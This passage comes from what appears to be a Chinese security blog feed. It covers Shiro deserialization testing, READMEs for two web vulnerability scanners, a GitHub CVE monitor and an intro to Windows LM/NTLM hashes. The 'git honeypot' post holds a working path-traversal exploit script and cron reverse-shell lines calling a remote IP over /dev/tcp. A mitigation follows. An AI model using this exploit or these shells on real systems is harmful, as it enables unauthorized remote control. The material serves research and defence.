<p>这个图<strong>又是假</strong>的，淦，用大佬的CC10链打了之后，突然怀疑之前的命令搞错了，我之前是用<code>whoami</code>测试的，我想起了mac命令执行不太一样，重新用<code>open -a Calculator</code>试了一遍，发现CC2链又可以成功了，瞬间凌乱（已经把添加的commons-collections4.0版本给注释了），这两天一直在重新测试找原因，通过重新下载shiro，切换版本重新来一遍，CC2并不可以打原生的shiro550，用大佬的CC10也打不出来，原因也找不到，前置知识缺的太多了，再搞下去也是浪费时间。</p>
<p>最终找到我为啥可以打成功，因为我在<code>shiro/samples/web</code>目录下生成过war包，当时是在测试4.0版本RCE，生成的target目录没有删除，之后启动的时候应该都是使用target目录下的东西，即使去除4.0版本依旧没用，生成的war包并没有改变还是可以RCE的4.0版本，搞得我怀疑人生。还有说<strong>JRMP</strong> 这个<strong>Gadget</strong>可以打，也是废了，没成功。</p>
<p>不搞了，心累，等补充完知识，再重新来吧</p>
<p>接下来通过<a href="https://github.com/frohoff/ysoserial%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E6%9D%A5%E5%AD%A6%E4%B9%A0java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E5%90%A7%EF%BC%8C%E6%85%A2%E6%85%A2%E6%9D%A5%E5%90%A7%E3%80%82">https://github.com/frohoff/ysoserial这个项目来学习java反序列化的利用链吧，慢慢来吧。</a></p>
<h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p>推荐一个Chrome插件—<strong>Toby for Chrome</strong>，适合舍不得关标签页，留待后续研究的。</p>
<p>中途参考的文章太多了，就用这个插件生成的分享链接吧</p>
<p><a href="https://www.gettoby.com/p/m9955hzbsf6s">https://www.gettoby.com/p/m9955hzbsf6s</a></p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>Jie 扫描器</title>
    <url>/2023/03/06/Jie%20%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
    <content><![CDATA[<h2 id="劫-开发中-持续更新中"><a href="#劫-开发中-持续更新中" class="headerlink" title="劫(开发中,持续更新中)"></a>劫(开发中,持续更新中)</h2><p>具体漏洞开发详情，请移步 <a href="https://jie.fireline.fun/">https://jie.fireline.fun/</a></p>
<p>基于浏览器爬虫开发的web漏洞主动 (被动) 扫描器</p>
<p>由于扫描器只是粗暴的调用 xray、nuclei ，不优雅，而且 xray 不开源，不开源的东西我加入自己的扫描器用着不舒服(纯属给自己挖坑，就当给自己加深漏洞理解了，开发中代码很烂勿喷)。于是产生一个想法，将漏扫类项目拆分出来，重新糅合成一个轮子。</p>
<p>目前打算设计成两种模式:</p>
<ul>
<li>一种被动 优先级低</li>
<li>一种主动</li>
</ul>
<h2 id="已有功能"><a href="#已有功能" class="headerlink" title="已有功能"></a>已有功能</h2><ul>
<li>Chrome Headless 爬虫, 爬取中进行指纹识别(katana)</li>
<li>指纹识别，根据指纹识别进行漏洞检测(nuclei)</li>
<li>基础漏洞扫描 (sql、xss 等) 待优化</li>
<li>目录扫描(bbscan规则)</li>
<li><del>一些端口弱口令爆破</del>(这还要在加上端口扫描，先去除)</li>
</ul>
<h2 id="语言环境识别"><a href="#语言环境识别" class="headerlink" title="语言环境识别"></a>语言环境识别</h2><p>防止对 php 的网站调用 java 的扫描插件</p>
<h2 id="插件调用-后期看看有没有必要吧"><a href="#插件调用-后期看看有没有必要吧" class="headerlink" title="插件调用(后期看看有没有必要吧)"></a>插件调用(后期看看有没有必要吧)</h2><p>插件如何调用？ 这里直接放弃，只要代码逻辑写好就行了，后期或者有重构的想法</p>
<p><del>仿照awvs设计了插件类别</del></p>
<p><del>PerFile 对每个文件处理,包括文件后面的参数</del></p>
<p><del>PerFolder 对每个目录处理</del></p>
<p><del>PerScheme 对每个域名处理</del></p>
<p><del>PostScan 对Post请求的处理</del></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><p><a href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a></p>
<p>添加了无头浏览器检测绕过 <a href="https://bot.sannysoft.com/">https://bot.sannysoft.com/</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/img/202303062213518.png" alt="BypassHeadlessDetect.png"></p>
<h3 id="被动扫描代理"><a href="#被动扫描代理" class="headerlink" title="被动扫描代理"></a>被动扫描代理</h3><p><a href="https://github.com/lqqyt2423/go-mitmproxy">https://github.com/lqqyt2423/go-mitmproxy</a></p>
<h3 id="Xss"><a href="#Xss" class="headerlink" title="Xss"></a>Xss</h3><p><a href="https://github.com/hahwul/dalfox">https://github.com/hahwul/dalfox</a> 什么玩意，发的包也太多了，后续去掉</p>
<p><a href="https://github.com/ac0d3r/xssfinder">https://github.com/ac0d3r/xssfinder</a></p>
<p><a href="https://github.com/kleiton0x00/ppmap">https://github.com/kleiton0x00/ppmap</a></p>
<h3 id="SQL-注入-TODO"><a href="#SQL-注入-TODO" class="headerlink" title="SQL 注入  TODO"></a>SQL 注入  TODO</h3><p>提取 <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> 中关于检测的代码，提取一部分思想就行了</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>通过指纹识别进行对应的漏洞检测</p>
<p>todo 不内置 nuclei 的 yml 文件，改为官方在线下载、更新</p>
<p><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></p>
<p>xray poc  中有些写的不规范，导致解析有问题，需要修改<br>比如：<br>response.status &#x3D;&#x3D; 200 &amp;&amp; response.headers[“content-type”] &#x3D;&#x3D; “text&#x2F;css” &amp;&amp; response.body.bcontains(b”$_GET[‘css’]”)</p>
<p>content-type 应为 Content-Type</p>
<p>但又好像是解析有问题</p>
<p>不使用 xray 的 poc，只使用 nuclei 的 yml 文件<br>一起使用还要整理，防止重复扫描，nuclei-template 的 poc 已经够了</p>
<h3 id="漏扫"><a href="#漏扫" class="headerlink" title="漏扫"></a>漏扫</h3><p><a href="https://github.com/wrenchonline/glint">https://github.com/wrenchonline/glint</a> 作者设计的我看不懂，自己重来</p>
<p><a href="https://github.com/veo/vscan">https://github.com/veo/vscan</a>	</p>
<h3 id="一些其他漏洞"><a href="#一些其他漏洞" class="headerlink" title="一些其他漏洞"></a>一些其他漏洞</h3><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson"></a>Fastjson</h3><p><a href="https://github.com/a1phaboy/FastjsonScan">https://github.com/a1phaboy/FastjsonScan</a></p>
]]></content>
      <categories>
        <category>开源工具</category>
      </categories>
      <tags>
        <tag>开源工具</tag>
      </tags>
  </entry>
  <entry>
    <title>SScan  一款src捡洞扫描器</title>
    <url>/2021/01/11/SScan/</url>
    <content><![CDATA[<h2 id="SScan"><a href="#SScan" class="headerlink" title="SScan"></a>SScan</h2><p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/python-3.6|3.7|3.8-blue" alt="python"></a></p>
<p><a href="https://github.com/yhy0/SScan/"><img src="https://img.shields.io/badge/release-v0.8-brightgreen" alt="python"></a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一款src捡洞扫描器，因没时间挖src，毕竟挖src是个费时费力的活，自19年8月起入坑至今，依靠 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a> 扫描出的信息和漏洞，利用业余时间从扫描报告中的资产<strong>捡洞</strong>和找洞，已经3次jd月度前十。萌发出自己写扫描器挖洞的念头，自动挖一些简单漏洞，赚点零花钱，同时提升一下开发能力，毕竟搞安全的不能不懂开发。</p>
<p>目前 <a href="https://github.com/yhy0/SScan">SScan</a> 的主要逻辑还是 <a href="https://github.com/lijiejie/BBScan.git">BBScan</a>。</p>
<h3 id="使用效果图"><a href="#使用效果图" class="headerlink" title="使用效果图"></a>使用效果图</h3><p><img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311094318.gif"></p>
<p>扫描结束后，结果报告在report目录下，并且存在漏洞时，默认会使用浏览器打开报告</p>
<h2 id="使用及参数"><a href="#使用及参数" class="headerlink" title="使用及参数"></a>使用及参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 SScan.py version                                查看版本</span><br><span class="line">python3 SScan.py --<span class="built_in">help</span>                                 获取帮助</span><br><span class="line">python3 SScan.py --host example.com run                 单个目标</span><br><span class="line">python3 SScan.py --file domains.txt run                 读取一个.txt文件</span><br><span class="line">python3 SScan.py --dire /Users/yhy/Desktop/dirs/ run    读取目录下的所有.txt</span><br><span class="line">python3 SScan.py --file domains.txt  --network 24 run   network设置一个子网掩码(8 ~ 31)，</span><br><span class="line">                配合上面3个参数中任意一个。将扫描Target/MASK 网络下面的所有IP</span><br><span class="line">python3 SScan.py --host 127.0.0.1 --script unauthorized_access_redis,unauthorized_access_rsync run</span><br><span class="line">                    只使用指定脚本 </span><br><span class="line"></span><br><span class="line">您可以通过在 config/setting.py 文件中指定fofa api信息, 调用fofa搜索更多的Web服务</span><br><span class="line"></span><br><span class="line">其它参数：</span><br><span class="line">    --t             扫描线程数, 默认10。</span><br><span class="line">    --full          处理所有子目录。 /x/y/z/这样的链接，/x/ /x/y/也将被扫描，默认为True</span><br><span class="line">    --crawl         爬取主页的&lt;a&gt;标签， 默认为True</span><br><span class="line">    --checkcdn      检查域名是否存在CDN，若存在则不对解析出的ip进行规则和脚本探测，默认为True</span><br><span class="line">    --browser       检测完成后，使用默认浏览器打开扫描报告，默认为True</span><br><span class="line">    --script        指定要使用的脚本，--script unauthorized_access_redis unauthorized_access_rsync, ... 脚本在scripts目录下</span><br><span class="line">    --rule          指定要扫描的规则，--rule RuleFileName1,RuleFileName2,... 规则在rules目录下</span><br><span class="line">    --script_only   只使用脚本进行扫描，不使用规则</span><br><span class="line">    --noscripts     不使用脚本扫描</span><br><span class="line">    --fofa       是否使用fofa扩大目标，默认为True，通过在lib/config/setting.py </span><br></pre></td></tr></table></figure>

<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><ul>
<li><p><input checked="" disabled="" type="checkbox"> 
常见目录扫描，比如备份文件、配置文件、日志文件等等，具体见<code>rules</code>目录下的详细规则</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
信息泄露漏洞，比如.idea、 .git、.DS_Store、springboot等等，具体见<code>rules</code>目录下的详细规则</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
后台登录页面资产发现</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
403页面绕过，具体绕过规则在<code>lib/common/scanner.py</code>的196行的<code>bypass_403</code>函数</p>
<p>  使用BurpSuite 实验室<a href="https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented">Lab: URL-based access control can be circumvented</a> 进行测试</p>
<p>  <img src="https://raw.githubusercontent.com/yhy0/PicGoImg/master/sscan/20210311084904.png" alt="image-20210106105118466"></p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
扫描某个网段，比如通过 <code>--network 24</code> 指定扫描C段资产，进行漏洞和信息发现</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
跳过存在CDN的IP，当检测到url解析的IP符合CDN特征时，不会将ip加入扫描目标中，只会扫描url</p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
一些常见未授权和弱口令检测，目前支持：</p>
<p>  redis、Hadoop、Hadoop yarn、docker、docker registry api、CouchDB、ftp、zookeeper、elasticsearch、memcached、mongodb、rsync、jenkins、jboss的未授权访问，mysql空口令、PostgreSQL 空口令 ，具体见<code>pocs/scripts</code> 目录</p>
<p>  对于数据库口令检测，目前只是检测是否存在空口令检测，后续会考虑要不要加入一些弱口令，进行检测。像这样 <a href="https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py">https://github.com/se55i0n/DBScanner/blob/master/lib/exploit.py</a></p>
</li>
<li><p><input checked="" disabled="" type="checkbox"> 
当在<code> lib/config/setting.py</code>  文件中指定fofa api 信息时，会调用fofa接口，搜索更多的Web服务</p>
</li>
</ul>
<h2 id="后续计划"><a href="#后续计划" class="headerlink" title="后续计划"></a>后续计划</h2><ul>
<li><input disabled="" type="checkbox"> <del>将<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a>项目中的一些功能集成进去，能够对js文件中的敏感信息、API进行测试</del>，添加此功能有点臃肿，而且有现成的(不是我懒)，1.0版本准备添加指纹识别，记录一个目标的各种信息，并生成报告，后续可以筛选出目标使用<a href="https://github.com/rtcatc/Packer-Fuzzer">Packer-Fuzzer</a> 进行批量扫描</li>
<li><input disabled="" type="checkbox"> 1.0版本添加指纹识别，记录一个目标的各种信息，并生成报告。</li>
<li><input disabled="" type="checkbox"> 继续优化各模块</li>
</ul>
<h2 id="rules目录下的规则描述"><a href="#rules目录下的规则描述" class="headerlink" title="rules目录下的规则描述"></a>rules目录下的规则描述</h2><ul>
<li><p>black.list 规则黑名单，命中则跳过</p>
</li>
<li><p>White.list 规则白名单 ，命中则认为存在薄弱点，加入结果</p>
</li>
<li><p>rules目录下的一些字段含义，rules目录下常见的格式就是这种</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/applicationContext-slave.xml &#123;tag=&quot;&lt;?xml&quot;&#125; &#123;status=200&#125; &#123;type=&quot;xml&quot;&#125; &#123;root_only&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p><code>/WEB-INF/applicationContext-slave.xml </code>目录 ，必有</p>
</li>
<li><p><code>&#123;tag=&quot;&lt;?xml&quot;&#125; </code>可选， 如果有的话，会比对 response.text ,即返回的html页面中是否存在tag，若没有，认为不存在该目录。</p>
</li>
<li><p><code>&#123;status=200&#125; </code>可选， 目录对应的状态码， 也是 作为判断该目录是否存在的一个条件，会比对页面的状态码和规则的状态码一致 </p>
</li>
<li><p><code>&#123;type=&quot;xml&quot;&#125;</code> 可选，与返回头信息 content-type 字段比对，也是判断目录存在的一个条件</p>
</li>
<li><p><code>&#123;root_only&#125;</code> 可选， 这个是表示该目录只在网站根目录下存在，之后与网站根目录拼接，进行检测，比如 <a href="https://www.baidu.com/WEB-INF/applicationContext-slave.xml">https://www.baidu.com/WEB-INF/applicationContext-slave.xml</a> 这样检查一次， 在 <a href="https://www.baidu.com/test/">https://www.baidu.com/test/</a> 这样的二级目录，并不会拼接检查，提高效率 ，</p>
<p> ps：必有：是指当想要自己添加规则时，必须添加的字段，可选：可以没有，但想要更加准确，最好写上。</p>
<p> 具体匹配检测在<code>lib/common/scanner.py</code> 的523行</p>
</li>
</ol>
</li>
</ul>
<h2 id="如何编写脚本插件"><a href="#如何编写脚本插件" class="headerlink" title="如何编写脚本插件"></a>如何编写脚本插件</h2><p>请参考scripts文件夹下的插件内容。self参数是一个Scanner对象(lib&#x2F;common&#x2F;scanner.py)，可使用Scanner对象的任意方法、属性。</p>
<p><code>self.host</code> <code>self.port</code> 是目标主机和端口</p>
<p><code>self.ports_open</code> 是开放的端口列表，是所有插件共享的。 一般不在插件执行过程中再单独扫描端口</p>
<p><code>self.session</code> 是HTTP连接池</p>
<p><code>self.http_request</code> 可发起HTTP GET请求</p>
<p><code>self.index_headers</code> <code>self.index_status</code> <code>self.index_html_doc</code> 是请求首页后返回的，一旦扫描器发现有插件依赖，会预先请求首页，保存下来，被所有插件公用</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/lijiejie/BBScan.git">BBScan</a></li>
<li><a href="https://github.com/shmilylty/OneForAll.git">oneforall</a> </li>
<li><a href="https://github.com/sting8k/BurpSuite_403Bypasser">BurpSuite_403Bypasser</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247489824&idx=1&sn=83d370a391fa8269c12848d87a62240a&chksm=9b393f91ac4eb687328e676b3ed0710078d5cb2d3185e0d38d5e7bd92403840d0fc224b443ba&mpshare=1&scene=24&srcid=12289jnCaJEnQZ4ZGqKk1uGX&sharer_sharetime=1609151769170&sharer_shareid=6806da86371afa965c2b99ffa8f84bab#rd">记一次403绕过技巧</a></li>
<li><a href="http://www.langzi.fun/Asyncio%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B.html">Asyncio并发编程</a></li>
<li><a href="https://github.com/test502git/Scanunauthorized">Scanunauthorized</a></li>
<li><a href="https://github.com/timwhitez/Frog-Auth/blob/main/pocs/pocs.py">Frog-Auth</a></li>
</ul>
<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。<br>    如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。<br>    除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。<br>    您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
<h2 id="Star趋势"><a href="#Star趋势" class="headerlink" title="Star趋势"></a>Star趋势</h2><p><a href="https://starchart.cc/yhy0/SScan"><img src="https://starchart.cc/yhy0/SScan.svg" alt="Stargazers over time"></a>
      </p>
]]></content>
      <categories>
        <category>开源工具</category>
      </categories>
      <tags>
        <tag>开源工具</tag>
      </tags>
  </entry>
  <entry>
    <title>git 蜜罐复现</title>
    <url>/2021/08/09/git%20%E8%9C%9C%E7%BD%90%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>  好久不见</p>
</blockquote>
<h2 id="0x01-git-蜜罐复现"><a href="#0x01-git-蜜罐复现" class="headerlink" title="0x01 git 蜜罐复现"></a>0x01 git 蜜罐复现</h2><p>具体原理请看 <a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> git</span><br><span class="line"></span><br><span class="line">repo = git.Repo.init(path=<span class="string">&quot;.&quot;</span>)</span><br><span class="line"></span><br><span class="line">repo.index.add(items=[<span class="string">&#x27;../../git_poc.txt&#x27;</span>])</span><br><span class="line"></span><br><span class="line">repo.index.commit(<span class="string">&#x27;commit&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>python3 -m pip install GitPython</code></p>
<p>python3 运行, 生成Poc </p>
<blockquote>
<p>  在当前目录的..&#x2F;..&#x2F;的目录下必须有git_poc.txt</p>
</blockquote>
<p>比如当前脚本目录为 <code>/Users/yhy/Desktop/gitpoc</code>,那么在<code>/Users/yhy</code>要存在<code>git_poc.txt</code></p>
<p>然后将 <strong>.git</strong> 文件夹整体拖入网站根目录下</p>
<p>效果：防止干扰我直接在虚拟机中运行 <a href="https://github.com/0xHJK/dumpall.git">dumpall</a> 工具</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174743.png" alt="image-20210809154939407"></p>
<p>没有在 <strong>dumpall&#x2F;192.168.100.250_8080</strong> 目录下生成文件，而是进行了<strong>目录穿越</strong>,在原计划（dumpall&#x2F;192.168.100.250_8080）两层外的目录下生成了git_poc</p>
<h3 id="1-1-计划任务反弹shell"><a href="#1-1-计划任务反弹shell" class="headerlink" title="1.1 计划任务反弹shell"></a>1.1 计划任务反弹shell</h3><p>先在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F; 下新建名为 root 的反弹shell代码文件。</p>
<p><code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.100.250/8888 0&gt;&amp;1</code></p>
<p>然后将<code>repo.index.add(items=[&#39;../../git_poc.txt&#39;])</code> 中的<code>../../git_poc.txt</code> 替换, 使用多个**..&#x2F;**,确保返回到根目录 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">repo.index.add(items=[<span class="string">&#x27;../../../../../../../../../../../../../../../../../../../../../../../../../../../var/spool/cron/crontabs/root&#x27;</span>])</span><br></pre></td></tr></table></figure>

<blockquote>
<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root (centos系列主机)</p>
<p>  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root (debian系列主机)</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174751.png" alt="image-20210809173416573"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174728.png" alt="image-20210809173349713"></p>
<h2 id="0x02-修复"><a href="#0x02-修复" class="headerlink" title="0x02 修复"></a>0x02 修复</h2><p>这就是个目录穿越漏洞，这里简单粗暴的将 <strong>..&#x2F;</strong> 全部删除，以dumpall为例 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># dumpall/dumper.py</span></span><br><span class="line">filename = <span class="built_in">str</span>(filename).replace(<span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;/&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;..;\\&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210809174721.png" alt="image-20210809174123558"></p>
<h2 id="0x03在ubuntu中反弹shell问题"><a href="#0x03在ubuntu中反弹shell问题" class="headerlink" title="0x03在ubuntu中反弹shell问题"></a>0x03在ubuntu中反弹shell问题</h2><p>有师傅反应说上一篇<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484658&idx=1&sn=84f39840f9a8104edc4fde4c7962fed6&chksm=c2829debf5f514fd40c1abbe73beabe02b2cbe1e190504bb5e060ab445d1cab086c247674fa4&scene=21#wechat_redirect">git 蜜罐复现</a>文章中在ubuntu和kali写入了计划任务，还是不能反弹shell。</p>
<p>关于这一点我在做实验时，一开始也是没有反弹shell，我手动编辑了几遍root文件，具体弹shell的代码并没有改变，然后就莫名其妙的弹回来了，忙着发文，也就没有再次实验，我的错。</p>
<p>今天又试了好多次，还是弹不回来，终于找到了原因，这东西就是<strong>ubuntu系统的原因，root文件的权限必须为600</strong>，还有就是弹的代码也有点问题，这是原文链接：</p>
<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
<p>shell不能反弹，可以写ssh公钥等，最后他给的弹shell代码<strong>好像</strong>还有点问题，在代码前后空一格，写入换行符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">*/1 * * * * bash -c <span class="string">&quot;bash -i &gt;&amp;/dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://drivertom.blogspot.com/2021/08/git.html?m=1">https://drivertom.blogspot.com/2021/08/git.html?m=1</a></p>
<p><a href="https://github.com/0xHJK/dumpall">https://github.com/0xHJK/dumpall</a> </p>
<p><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
        <category>蜜罐</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>蜜罐</tag>
      </tags>
  </entry>
  <entry>
    <title>gitHub_cve_monitor</title>
    <url>/2021/02/25/github_cve_monitor/</url>
    <content><![CDATA[<blockquote>
<p>没事少矫情，有空多赚钱。</p>
</blockquote>
<h2 id="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"><a href="#监控github上新增的cve编号项目漏洞，推送钉钉或者server酱" class="headerlink" title="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"></a>监控github上新增的cve编号项目漏洞，推送钉钉或者server酱</h2><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m pip install dingtalkchatbot</span><br><span class="line">python3 github_cve_monitor.py</span><br></pre></td></tr></table></figure>

<p>每3分钟检测一次github是否有新的cve漏洞提交记录，若有则通过server酱和钉钉机器人推送（二者配置一个即可）</p>
<p>时间间隔修改在 58 行</p>
<p>建议使用<a href="https://www.runoob.com/linux/linux-comm-screen.html">screen命令</a>运行在自己的linux vps后台上，就可以愉快的接收各种cve了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -S github_cve	<span class="comment">#创建一个screen，名字为github_cve，在新窗口运行本项目, 成功后直接叉掉该窗口, 项目就会在后台一直运行了</span></span><br><span class="line"></span><br><span class="line">screen -<span class="built_in">ls</span> 		<span class="comment">#查看创建的screen</span></span><br><span class="line"></span><br><span class="line">screen -r github_cve	<span class="comment">#连接github_cve后台screen，如果存在的话</span></span><br></pre></td></tr></table></figure>



<p>钉钉机器人配置在 33行的 dingding函数中，需要钉钉建群，添加钉钉机器人，复制 webhook 替换即可</p>
<p>server酱配置在 40行的 server 函数中，ps：因微信的原因，server酱的旧版将在2021年4月后下线，新版以企业微信为主，这里使用的是旧版，想改新版的话，搞个企业微信，从新配置server酱，使用新链接 sctapi.ftqq.com</p>
<p>具体查看server酱官方，<a href="http://sc.ftqq.com/">http://sc.ftqq.com/</a> ，配置简单，只需要将脚本中的uri换掉即可</p>
<p><a href="https://sct.ftqq.com/">server酱新版</a>支持多通道（微信、客户端、群机器人、邮件和短信）</p>
<h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225093627.png" alt="image-20210225090416314"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225094630.jpg" alt="751614217534_.pic"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210225093635.png" alt="image-20210225092350481"></p>
<p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li>洛米唯熊 	<a href="https://my.oschina.net/u/4581868/blog/4380482">https://my.oschina.net/u/4581868/blog/4380482</a></li>
<li>kiang70      <a href="https://github.com/kiang70/Github-Monitor">https://github.com/kiang70/Github-Monitor</a></li>
</ul>
]]></content>
      <categories>
        <category>开源工具</category>
      </categories>
      <tags>
        <tag>开源工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows系统散列值获取</title>
    <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<blockquote>
<p>  明年今日，人生一大喜事(≧∇≦)ﾉ  弱弱问一句我很胖吗？183 165</p>
</blockquote>
<h1 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h1><h2 id="0x01-LM-Hash与NTLM-Hash"><a href="#0x01-LM-Hash与NTLM-Hash" class="headerlink" title="0x01 LM Hash与NTLM Hash"></a>0x01 LM Hash与NTLM Hash</h2><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在<code>ntds.dit</code>中，加密后为散列值。</p>
<p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash。在Windows操作系统中，Hash的结构通常如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:RID:LM-HASH:NT-HASH</span><br></pre></td></tr></table></figure>

<blockquote>
<p>  LM Hash的全名为”LAN Manager Hash”，是微软为了提高Windows操作系统的安全性而采用的散列值加密算法，其本质是DES加密。尽管LM Hash比较容易破解，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了（从 Windows Vista 和 Windows 2008 版本开始禁用）。如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash值通常是”aad3b435b51404eeaad3b435b51404ee”(表示LM Hash值为空或者被禁用)。</p>
<p>  NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。NTLM Hash是基于MD4加密算法进行加密的。个人版从Windows Vista 以后，服务器版从Windows Server 2003以后，Windows操作系统的认证方式均为NTLM Hash。</p>
</blockquote>
